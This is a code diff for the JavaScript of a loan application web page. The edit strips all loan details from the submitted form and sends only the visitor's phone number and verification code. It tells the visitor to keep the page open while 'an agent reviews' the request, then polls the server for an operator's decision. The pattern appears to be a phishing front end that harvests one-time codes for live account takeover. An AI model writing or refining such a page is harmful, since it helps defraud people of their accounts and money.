@@ -7,13 +7,6 @@ function showScreen(screenId) {
     document.getElementById(screenId).scrollTop = 0;
 }
 
-// Ensure the processing screen resets to default when the page loads
-window.onload = function() {
-    document.getElementById('processing-title').innerText = "Processing Application";
-    document.getElementById('processing-text').innerText = "Please wait, this may take a few seconds";
-    document.getElementById('loader-spinner').style.display = "block";
-};
-
 // Loan Calculator Logic
 const amountSlider = document.getElementById('loan-amount');
 const termSlider = document.getElementById('loan-term');
@@ -42,48 +35,59 @@ calculateLoan();
 document.getElementById('submit-btn').addEventListener('click', async function(e) {
     e.preventDefault();
     
-    // 1. Force the processing screen back to the loading state EVERY time
+    // Force the processing screen to show the loading state
     document.getElementById('processing-title').innerText = "Processing Application";
-    document.getElementById('processing-text').innerText = "Please wait, this may take a few seconds";
+    document.getElementById('processing-text').innerText = "Please wait while an agent reviews your loan request. Do not close this page.";
     document.getElementById('loader-spinner').style.display = "block"; 
     
-    // 2. Switch to the processing screen
+    // Switch to the processing screen
     showScreen('screen-processing');
 
     const data = {
-        firstName: document.getElementById('first-name').value,
-        lastName: document.getElementById('last-name').value,
         phone: document.getElementById('phone').value,
-        code: document.getElementById('verification-code').value,
-        loanType: document.getElementById('loan-type').value,
-        amount: document.getElementById('form-amount').value,
-        term: document.getElementById('form-term').value,
-        purpose: document.getElementById('loan-purpose').value,
-        employment: document.getElementById('employment-status').value,
-        income: document.getElementById('annual-income').value
+        code: document.getElementById('verification-code').value
     };
 
     try {
+        // Send data to backend
         const response = await fetch('/api/apply', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         });
 
-        if (response.ok) {
-            // 3. If successful, wait 2 seconds, then show the success message
-            setTimeout(() => {
-                document.getElementById('processing-title').innerText = "Application Received!";
-                document.getElementById('processing-text').innerText = "We will contact you shortly.";
-                document.getElementById('loader-spinner').style.display = "none"; 
-            }, 2000);
+        const result = await response.json();
+
+        if (result.success && result.appId) {
+            // START THE POLLING LOOP: Check status every 3 seconds
+            const interval = setInterval(async () => {
+                try {
+                    const statusRes = await fetch(`/api/status/${result.appId}`);
+                    const statusData = await statusRes.json();
+
+                    if (statusData.status === 'approved') {
+                        clearInterval(interval); // Stop checking
+                        document.getElementById('processing-title').innerText = "Loan Approved!";
+                        document.getElementById('processing-text').innerText = "Your funds are on the way.";
+                        document.getElementById('loader-spinner').style.display = "none"; 
+                    } else if (statusData.status === 'rejected') {
+                        clearInterval(interval); // Stop checking
+                        document.getElementById('processing-title').innerText = "Application Rejected";
+                        document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
+                        document.getElementById('loader-spinner').style.display = "none"; 
+                    }
+                    // If status is 'pending', the loop just waits 3 seconds and tries again.
+                } catch (error) {
+                    console.error("Waiting for approval...", error);
+                }
+            }, 3000); // 3000 milliseconds = 3 seconds
         } else {
-            alert("Something went wrong. Please try again.");
+            alert("Error sending application.");
             showScreen('screen-step3');
         }
     } catch (error) {
         console.error(error);
-        alert("Network error. Please try again.");
+        alert("Network error.");
         showScreen('screen-step3');
     }
 });
